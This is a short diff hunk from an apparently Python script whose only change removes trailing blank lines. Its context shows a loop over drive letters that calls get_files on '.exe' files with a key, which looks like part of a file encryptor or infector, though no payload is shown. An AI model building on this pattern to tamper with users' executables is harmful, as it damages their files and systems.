@@ -34,5 +34,3 @@ for _ in range(6):
     get_files(".exe",f"{drives[-1]}:\\",key)
     
     drives.pop()
-    
-    
